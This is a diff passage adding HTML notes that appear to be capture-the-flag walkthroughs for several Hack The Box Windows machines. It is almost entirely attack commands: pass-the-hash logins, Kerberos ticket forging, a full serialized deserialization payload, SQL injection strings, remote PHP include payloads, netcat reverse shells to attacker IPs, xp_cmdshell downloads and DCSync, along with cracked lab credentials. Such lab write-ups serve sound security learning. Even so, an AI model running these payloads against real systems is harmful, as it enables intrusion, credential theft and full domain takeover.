+                        <br>`wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175`
+                        <br>OR `evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Scrambled (Medium/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>enum website, /supportrequest.html found username 'ksimpson' in a cmd screenshot, /passwords.html says about "reset your password to be the same as the username" 
+                        <br>`smbclient.py -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local` `help` `shares` `use public` `get Network Security Changes.pdf`
+                        <br>'Network Security Changes.pdf' says "NTLM is disabled" "now everything is done via Kerberos" "SQL database has had access removed from the HR department"
+                        <br>Failed: `GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -debug` 
+                        <br>note: if NTLM is disabled, GetUserSPNs.py need_to_fix https://github.com/fortra/impacket/issues/1206
+                        <br>Use the -dc-ip option but specify the fully qualified domain name of a DC rather than the IP, line 260 : use 'target = self.__kdcHost' instead of 'target = self.getMachineName()'
+                        <br>`GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -request -k`
+                        <br>`hashcat mssqlsvc-hash /usr/share/wordlists/rockyou.txt` got cred sqlsvc:Pegasus60
+                        <br>generate NTLM hash: `iconv -f ASCII -t UTF-16LE &lt;(printf "Pegasus60") | openssl dgst -md4` b999a16500b87d17ec7f2e2a68778f05
+                        <br>get SSL/TLS certificate: `openssl s_client -connect dc1.scrm.local:636` save as 'ldapserver.pem'
+                        <br>edit 'TLS_CACERT' in '/etc/ldap/ldap.conf' point to the full path of 'ldapserver.pem'
+                        <br>dump all users: `ldapsearch -h dc1.scrm.local -Z -D ksimpson@scrm.local -w ksimpson -b "DC=scrm,DC=local" "(objectClass=user)"`  objectSid:: AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA==
+                        <br>get SID: `getPac.py -targetUser administrator scrm.local/ksimpson:ksimpson` OR use 0xdf's sid.py script and the SID_string from ldapsearch SID: S-1-5-21-2743207045-1827831105-2542523200
+                        <br>get sliver ticket: `ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -dc-ip dc1.scrm.local -spn MSSQLSvc/dc1.scrm.local:1433 administrator` [*] Saving ticket in administrator.ccache
+                        <br>note: On Linux, Kerberos looks in predefined places for tickets, like /tmp/krb5cc_[uid of current user] and any file pointed to by the KRB5CCACHE environment variable
+                        <br>`cp administrator.ccache /tmp/krb5cc_0` OR `export KRB5CCNAME=administrator.ccache` and verify in the end with `klist`
+                        <br>`mssqlclient.py -k dc1.scrm.local` `select name, database_id from sys.databases;` `SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;`
+                        <br>`SELECT * from ScrambleHR.dbo.UserImport;` got cred MiscSvc:ScrambledEggs9900  scrm.local
+                        <br>/etc/krb5.conf: 
+                        <br>[libdefaults]
+                        <br>    default_realm = SCRM.LOCAL
+                        <br>[realms]
+                        <br>    SCRM.LOCAL = {
+                        <br>        kdc = dc1.scrm.local
+                        <br>        admin_server = dc1.scrm.local
+                        <br>    }
+                        <br>note: we can not use `evil-winrm` because NTLM is disabled, but we can use `pwsh`
+                        <br>`sudo pwsh` `update-help` `Install-Module -Name PSWSMan -Scope AllUsers` Yes_to_All `Install-WSMan` `exit`
+                        <br>restart pwsh `sudo pwsh` `Enter-PSSession dc1.scrm.local -Credential MiscSvc` enter password: ScrambledEggs9900
+                        <br>get a proper shell `iwr 10.10.14.6/nc64.exe -outfile nc64.exe` `rlwrap -cAr nc -lnvp 443`
+                        <br><span class="step_title">Privilege_escalation 1(MiscSvc->system)</span>
+                        <br>......the process of identify the .NET object deserialization and exploit it is way out of my exp, but I'll sum it a up down here
+                        <br>'C:\shares\IT\Apps\Sales Order Client\' found and download 'ScrambleClient.exe' and 'ScrambleLib.dll' 
+                        <br>run it on windows, follow webpage steps to connect target, (need to edit C:\Windows\System32\drivers\etc\hosts just like /etc/hosts)
+                        <br>after login the app, “Tools” > “Enable Debug Logging” and update a new order to trigger traffic, we can find 'ScrambleDebugLog.txt' in the same directory as the exe(also can use wireshark)
+                        <br>analize the log found 'Deserialization', analize ScrambleClient.exe with dnSpy.exe on windows
+                        <br>.NET object deserialization https://github.com/pwntester/ysoserial.net
+                        <br>PS > .\ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc64.exe 10.10.14.6 444 -e cmd.exe"
+                        <br>`nc 10.10.11.168 4411`, set listener and send the payload beload to get system shell
+                        <br>UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL8DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA4QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtOCI/Pg0KPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgSXNJbml0aWFsTG9hZEVuYWJsZWQ9IkZhbHNlIiB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczpzZD0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIiB4bWxuczp4PSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCI+DQogIDxPYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQogICAgPHNkOlByb2Nlc3M+DQogICAgICA8c2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgICAgIDxzZDpQcm9jZXNzU3RhcnRJbmZvIEFyZ3VtZW50cz0iL2MgQzpcXHByb2dyYW1kYXRhXFxuYzY0LmV4ZSAxMC4xMC4xNC42IDQ0NCAtZSBjbWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgsL
+                        <br><span class="step_title">Privilege_escalation 2(MiscSvc->system)</span>
+                        <br>fix sql xp_cmdshell first
+                        <br>SQL> EXECUTE sp_configure 'show advanced options', 1
+                        <br>SQL> RECONFIGURE
+                        <br>SQL> EXECUTE sp_configure 'xp_cmdshell', 1
+                        <br>SQL> RECONFIGURE
+                        <br>SQL> xp_cmdshell whoami /all
+                        <br>'SeImpersonatePrivilege Enabled'
+                        <br>SQL> xp_cmdshell powershell curl 10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe
+                        <br>SQL> xp_cmdshell powershell curl 10.10.14.6/rev.bat -outfile C:\\programdata\\rev.bat
+                        <br>rev.bat content: C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443
+                        <br>SQL> xp_cmdshell powershell curl 10.10.14.6/JuicyPotatoNG.exe -outfile C:\\programdata\\jp.exe
+                        <br>RoguePotato also works
+                        <br>`rlwrap -cAr nc -lvnp 443`
+                        <br>SQL> xp_cmdshell C:\\programdata\\jp.exe -t * -p C:\\programdata\\rev.bat
+                        <br>and we got system shell
+                        <br><span class="step_title">Unintended File Read Via MSSQL</span>
+                        <br>SQL> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Search (Hard/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>TLS certs found 'research.search.htb' and page img zoom found "Send password to Hope Sharp" "IsolationIsKey?"
+                        <br>create userlist file hope.txt and fill with 'hope sharp h.sharp hope.s hope.sharp hopesharp' one per line
+                        <br>`crackmapexec smb 10.10.11.129 -u hope.txt -p IsolationIsKey? --continue-on-success` found hope.sharp:IsolationIsKey?
+                        <br>`smbmap -u hope.sharp -p IsolationIsKey? -R -H 10.10.11.129 --no-banner` /RedirectedFolders$ got a lot usernames as folder
+                        <br>`ldapsearch -h 10.10.11.129 -x -s base namingcontexts` `ldapsearch -h 10.10.11.129 -x -b "DC=search,DC=htb"` 
+                        <br>`ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb"`
+                        <br>my kali can't run -h `ldapsearch -H ldap://10.10.11.129 -x -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb" > ldapsearch.txt`
+                        <br>`ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/` output html, looks good
+                        <br>`bloodhound-python -u hope.sharp -p IsolationIsKey? -d search.htb -c All -ns 10.10.11.129 --zip`
+                        <br>in bloodhound, "List all Kerberoastable Accounts" shows WEB_SVC and KRBTGT
+                        <br>`GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp -outputfile web_svc.hash` enter password: IsolationIsKey?
+                        <br>`hashcat web_svc.hash /usr/share/wordlists/rockyou.txt` got cred web_svc:@3ONEmillionbaby but it does not really help
+                        <br>`cat bloodhound/20230906054646_users_multi_lines.json | jq -r '.data[].Properties.samaccountname' > users.txt`
+                        <br>`crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success` found Edgar.Jacobs:@3ONEmillionbaby 
+                        <br>`smbmap -u edgar.jacobs -p '@3ONEmillionbaby' -H 10.10.11.129 -s helpdesk -R` found \edgar.jacobs\Desktop\Phishing_Attempt.xlsx
+                        <br>`smbclient //10.10.11.129/RedirectedFolders$ '@3ONEmillionbaby' -U edgar.jacobs` smb: \edgar.jacobs\> get Desktop\Phishing_Attempt.xlsx 
+                        <br>in xlsx file, there is a C column which is hidden
+                        <br>0xdf: https://yodalearning.com/tutorials/unprotect-excel/
+                        <br>ippsec: http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/
+                        <br>follow the steps in webpage, mkdir and `unzip Phishing_Attempt.xlsx` `sed -i 's/&lt;sheetProtection[^&gt;]*&gt;//' xl/worksheets/sheet2.xml` `zip -fr Phishing_Attempt.xlsx *`
+                        <br>open again, we can see C column is password, save the users and passwords into files
+                        <br>`crackmapexec smb 10.10.11.129 -u Phishing_Attempt_users.txt -p Phishing_Attempt_passwords.txt --no-bruteforce --continue-on-success` found Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
+                        <br>`smbclient //10.10.11.129/RedirectedFolders$ '$$49=wide=STRAIGHT=jordan=28$$18' -U sierra.frye` 
+                        <br>smb: \> get sierra.frye\Desktop\user.txt
+                        <br><span class="step_title">Privilege_escalation()</span>
+                        <br>smb: \sierra.frye\Downloads\Backups\> get search-RESEARCH-CA.p12
+                        <br>smb: \sierra.frye\Downloads\Backups\> get staff.pfx
+                        <br>try to import into browser but it need password.
+                        <br>`/usr/share/john/pfx2john.py search-RESEARCH-CA.p12 > search-RESEARCH-CA.p12.hash` `john --wordlist=/usr/share/wordlists/rockyou.txt search-RESEARCH-CA.p12.hash` got cred: misspissy
+                        <br>`/usr/share/john/pfx2john.py staff.pfx > staff.pfx.hash` `john --wordlist=/usr/share/wordlists/rockyou.txt staff.pfx.hash` got cred: misspissy
+                        <br>gobuster dir https://search.htb found /staff is 403, but after import certs, it is a 'windows powershell web access'
+                        <br>login with Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18  computer_name: research
+                        <br>in bloodhound, "Shortest Paths to Domain Admins from Owned Principles" 
+                        <br>user 'Sierra.Frye' is in 'BIRMINGHAM-ITSEC' group, which is in 'ITSEC' group, which has 'ReadGMSAPassword' over user 'BIR-ADFS-GMSA', which has 'GenericAll' over user 'Tristan.Davies', which is in 'Domain Admins' group
+                        <br>I have not tried this: https://github.com/rvazarkar/GMSAPasswordReader
+                        <br>0xdf & ippsec both use this: https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
+                        <br>PS C:\Users\Sierra.Frye\Documents> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
+                        <br>PS C:\Users\Sierra.Frye\Documents> $mp = $gmsa.'msDS-ManagedPassword'
+                        <br>PS C:\Users\Sierra.Frye\Documents> ConvertFrom-ADManagedPasswordBlob $mp
+                        <br>"CurrentPassword field looks like gibberish, but that’s the point of having a GMSA"
+                        <br>PS C:\Users\Sierra.Frye\Documents> (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+                        <br>check if it works, then store it in $password also $SecPass
+                        <br>PS C:\Users\Sierra.Frye\Documents> $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
+                        <br>PS C:\Users\Sierra.Frye\Documents> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+                        <br>with the 'BIR-ADFS-GMSA' cred store in $SecPass, we can overwrite 'Tristan.Davies' password
+                        <br>PS C:\Users\Sierra.Frye\Documents> $cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass
+                        <br>PS C:\Users\Sierra.Frye\Documents> Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText '0xdf0xdf!!!' -force)} -Credential $cred
+                        <br>`wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'` now `whoami /all` we have 'domain admins' group membership
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Secnotes (Medium/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>tcp/80 register and login
+                        <br>found /change_pass.php accept GET request and don't need old pass
+                        <br>found /contact.php leak username tyler, and if submit a URL of kali_python_server, it got hit, which means the user(script) clicked the link
+                        <br>XSRF(Cross-Site Request Forgery) aka “one-click attack” and “session riding” but it is easily defeated by including POST parameters such as a token in the form that generates the request which would not be replicated in the link passed to the target.
+                        <br>use burp to intercept our /change_pass.php GET request and submit: http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit
+                        <br>now we can login as tyler:password OR just register as [' or 1='1]
+                        <br>after login as tyler or [' or 1='1] we found: \secnotes.htb\new-site  tyler / 92g!mA8BGjOirkL%OG*&
+                        <br>`smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //10.10.10.97/new-site` found iisstart.htm which seems to be the webroot of 8808/tcp
+                        <br>`put /opt/shells/php/cmd.php 0xdf.php` `put /opt/shells/netcat/nc.exe nc.exe`
+                        <br>`curl "http://10.10.10.97:8808/0xdf.php?cmd=nc.exe+-e+cmd.exe+10.10.14.15+443"`
+                        <br><span class="step_title">Privilege_escalation(tyler->administrator)</span>
+                        <br>found C:\Users\tyler\Desktop\bash.lnk which prove there is a bash.exe
+                        <br>`where /R c:\ bash.exe` output: c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+                        <br>run it will enter a linux container,and the '.bash_history' is not empty
+                        <br>root@SECNOTES:~# cat .bash_history
+                        <br>found 'smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$'
+                        <br>`winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe` OR `psexec.py administrator@10.10.10.97`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Servmon (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>ftp anonymous found /Users/Nadine/Confidential.txt which has hint: user 'Nathan' has place 'Passwords.txt' at Desktop of user 'Nadine'
+                        <br>tcp80 redirect to /Pages/login.htm, which looks like a login form of NVMS-1000
+                        <br>`searchsploit "nvms 1000"` found 'NVMS 1000 - Directory Traversal' https://www.exploit-db.com/exploits/47774
+                        <br>GET /../../../../../../../../../../../../windows/win.ini  test good
+                        <br>GET /../../../../../../../../../../../../users/nathan/desktop/passwords.txt  save in a file, also the 2 users we know
+                        <br>`crackmapexec smb 10.10.10.184 -u users -p passwords` found cred nadine:L1k3B1gBut7s@W0rk
+                        <br>`ssh nadine@10.10.10.184` with L1k3B1gBut7s@W0rk
+                        <br><span class="step_title">Privilege_escalation(nadine–>SYSTEM)</span>
+                        <br>NSClient++ 0.5.2.35 - Privilege Escalation https://www.exploit-db.com/exploits/46802
+                        <br>find NSClient++ password ew2x6SsGTxjRwXOT by c:\Program Files\NSClient++>type nsclient.ini OR C:\Program Files\NSClient++>nscp web -- password --display
+                        <br>but we can't login tcp8443 with it, because 'allowed hosts = 127.0.0.1' in nsclient.ini
+                        <br>`ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443` now we can login https://127.0.0.1:8443/
+                        <br>Settings>>external_scripts>>scripts setup payload based on 'info' example, scheduler>>schedules setup schedule (Changes>>Save_configuration)
+                        <br>OR do it in cli
+                        <br>nadine@SERVMON c:\temp>curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/revshell.bat --data-binary "C:\Temp\nc.exe 10.10.14.19 443 -e cmd.exe" 
+                        <br>nadine@SERVMON c:\temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/revshell/commands/execute?time=1m
+                        <br>OR trigger it by restart the service
+                        <br>PS> Get-Service nscp | fl *
+                        <br>found 'CanStop : True' 
+                        <br>`sc.exe stop nscp` `sc.exe start nscp`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Silo (Medium/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>nmap found '1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)'
+                        <br>ODAT (Oracle Database Attacking Tool) https://github.com/quentinhardy/odat
+                        <br>`./odat-libc2.17-x86_64 --help`
+                        <br>`./odat-libc2.17-x86_64 all -s 10.10.10.82 -p 1521` and C 'continue without asking' found cred scott/tiger
+                        <br>`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.19 lport=9001 -f exe -o ../9001.exe`
+                        <br>`./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ 9001.exe ../9001.exe`
+                        <br>`./odat-libc2.17-x86_64 externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ 9001.exe`
+                        <br>the listener got system shell
+                        <br>OR more detail steps by 0xdf: https://0xdf.gitlab.io/2018/08/04/htb-silo.html#oracle-db---port-1521
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="insane">Sizzle (Insane/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`smbmap -H 10.10.10.103 -u anonymous -R` 
+                        <br>if we upload some file to /Users/Public it will get deleted timely
+                        <br>upload a test.scf file with following content: 
+                        <br>[Shell]
+                        <br>Command=2
+                        <br>IconFile=\\10.10.14.4\icon
+                        <br>note: .scf = Windows Explorer Shell Command files
+                        <br>`responder -I tun0` got hash, crack got cred amanda:Ashare1972
+                        <br>`mount -t cifs -o username=amanda,password=Ashare1972 "//10.10.10.103/CertEnroll" /mnt` found cert files, save for later
+                        <br>`ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103 -o ./ldap/` analize user and group
+                        <br>gobuster dir with /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt found //certenroll/ and //certsrv/
+                        <br>get the CSR(Certificate Signing Request)
+                        <br>I use `openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr` (Not sure where I got this)
+                        <br>ippsec use `openssl genrsa -des3 -out amanda.key 2048` `openssl req -new -key amanda.key -out amanda.csr`
+                        <br>login /certsrv/ with amanda:Ashare1972 then click request_a_certificate>>advanced_certificate_request, paste the amanda.csr content and submit, download base64 format
+                        <br>0xdf shows another way, which is install the cert and backup(download) then use openssl export the cert and key 
+                        <br>login /certsrv/ with amanda:Ashare1972 then click request_a_certificate>>user_certificate>>install_this_certificate and backup/download this cert got amanda.p12 file
+                        <br>`openssl pkcs12 -in amanda.p12 -nocerts -out amanda.key` `openssl pkcs12 -in amanda.p12 -clcerts -nokeys -out amanda.crt`
+                        <br>Both way end up with 2 files: .crt .key
+                        <br>`wget https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb`
+                        <br>edit [endpoint: 'https://10.10.10.103:5986/wsman',] and change [user: 'username', password: 'password',] to [client_cert: 'amanda.crt', client_key: 'amanda.key', key_pass: '',]
+                        <br>`ruby winrm_shell_amanda.rb` I got error and `gem install httpclient`
+                        <br><span class="step_title">Privilege_escalation(break_out_ConstrainedLanguage_mode)</span>
+                        <br>PS htb\amanda@SIZZLE Documents> $executioncontext.sessionstate.languagemode
+                        <br>ConstrainedLanguage
+                        <br>Bypass for PowerShell Constrained Language Mode https://github.com/padovah4ck/PSByPassCLM
+                        <br>compile in VS or just use the one in /PSByPassCLM/bin/x64/Debug and upload to target
+                        <br>PS htb\mrlky@SIZZLE temp> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.3 /rport=443 \windows\temp\PsBypassCLM.exe
+                        <br>and listen new shell `$executioncontext.sessionstate.languagemode` output: FullLanguage
+                        <br><span class="step_title">Privilege_escalation(amanda–>mrlky)</span>
+                        <br>Rubeus is a C# toolset for raw Kerberos interaction and abuses https://github.com/GhostPack/Rubeus
+                        <br>upload as r.exe `.\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`
+                        <br>OR
+                        <br>root@kali# /opt/chisel/chisel server -p 8008 --reverse
+                        <br>PS C:\windows\temp> .\c.exe client 10.10.14.4:8008 R:88:127.0.0.1:88 R:389:localhost:389
+                        <br>root@kali# GetUserSPNs.py -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out
+                        <br>both got mrlky hash `hashcat GetUserSPNs.out --wordlist /usr/share/wordlists/rockyou.txt` get cred mrlky:Football#7
+                        <br>`openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr`
+                        <br>do the same crt steps for mrlky with mrlky.csr and edit then launch `ruby winrm_shell_mrlky.rb`
+                        <br>do the same break_out_ConstrainedLanguage_mode for mrlky shell and enum
+                        <br><span class="step_title">Privilege_escalation(mrlky->administrator)</span>
+                        <br>`iex(new-object net.webclient).downloadstring('http://10.10.14.3/SharpHound.ps1')`
+                        <br>`. .\SharpHound.ps1`
+                        <br>`invoke-bloodhound -collectionmethod all -outputDirectory C:\users\mrlky\`
+                        <br>download and analize by booldhound found user 'mrlky' has 'DCSync' 'GetChangesAll' 'GetChanges' over 'HTB.LOCAL' domain
+                        <br>`secretsdump.py -just-dc mrlky:Football#7@10.10.10.103` found administrator NT hash
+                        <br>`wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103`
+                        <br><span class="step_title">short_cuts 1(found hashes in file.txt)</span>
+                        <br>found hashes in C:\windows\system32\file.txt
+                        <br>PS htb\amanda@SIZZLE system32> type file.txt
+                        <br>root@kali# secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef -just-dc HTB.LOCAL/mrlky@10.10.10.103
+                        <br><span class="step_title">short_cuts 2(found writable clean.bat)</span>
+                        <br>original_content: forfiles -p "C:\Department Shares\Users\Public" -s -m *.* /C "cmd /c del @path"
+                        <br>PS htb\amanda@SIZZLE documents> icacls clean.bat
+                        <br>HTB\amanda:(I)(F)
+                        <br>PS htb\amanda@SIZZLE documents> echo "" | out-file -encoding ASCII -append clean.bat
+                        <br>PS htb\amanda@SIZZLE documents> echo '\windows\system32\spool\drivers\color\n.exe -e cmd.exe 10.10.14.4 443' | out-file -encoding ASCII -append test.bat
+                        <br>listener will get administrator shell
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">StreamIO (Medium/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>https://watch.streamio.htb/Search.php  manual SQL injection(WAF block '0x' and 'ORDER BY')
+                        <br>portswigger SQLI cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet#database-version
+                        <br>[';– -] [df' union select 1,2,3,4,5,6;-- -] [df' union select 1,@@version,3,4,5,6;-- -]  MSSQL 2019 15.0.2000.5x64
+                        <br>MSSQL cheatsheet: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+                        <br>Non-crackable: `responder -I tun0` [df'; use master; exec xp_dirtree '\\10.10.14.6\share';-- -] got a machine account hash
+                        <br>list all dbs: [df' union select 1,name,DB_NAME(),4,5,6 from master..sysdatabases;-- -] master,model,msdb,STREAMIO,streamio_backup,tempdb
+                        <br>list current db: [df' union select 1,(select DB_NAME()),3,4,5,6;-- -]  output: STEAMIO
+                        <br>list STEAMIO tables: [ippsec' union select 1,(SELECT STRING_AGG(name,',') name FROM STEAMIO..sysobjects WHERE xtype = 'U'),3,4,5,6;-- -]
+                        <br>list STEAMIO.users columns: [ippsec' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users');-- -]
+                        <br>display contents: [ippsec' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -] save usernames and hashes and crack
+                        <br>Failed(none_works): `crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success`
+                        <br>`hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"` got cred yoshihide:66boysandgirls..
+                        <br>after login in yoshihide, we can access /admin and found each of the button leads to a parm. like 'User management' leads to https://streamio.htb/admin/?user=
+                        <br>`wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o" --hh 1678` found https://streamio.htb/admin/?debug=
+                        <br>https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php and `base64 -d` we found:  "Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890' 
+                        <br>feroxbuster found /admin/master.php which has hint: "Only accessable through includes"
+                        <br>https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php and `base64 -d` we found: eval(file_get_contents($_POST['include']))
+                        <br>In burp, we can use POST parm 'include' to get code execution, such as "include=http://10.10.14.19/payload.php"
+                        <br>0xdf payload.php: system("powershell -c wget 10.10.14.6/nc64.exe -outfile \\programdata\\nc64.exe"); system("\\programdata\\nc64.exe -e powershell 10.10.14.6 443"); 
+                        <br>ippsec payload.php: system("curl 10.10.14.23/nc64.exe -o c:\\windows\\temp\\nc64.exe"); system("c:\\windows\\temp\\nc64.exe 10.10.14.23 4444 -e cmd.exe");
+                        <br>I use 0xdf payload with: `curl --silent -X POST -k "https://streamio.htb/admin/?debug=master.php" --data-urlencode "include=http://10.10.14.19/payload.php" --cookie "PHPSESSID=hqgmr9p1o14he1fl6vubv8ouq7"`
+                        <br>listener got yoshihide shell
+                        <br><span class="step_title">Privilege_escalation(yoshihide->nikk37)</span>
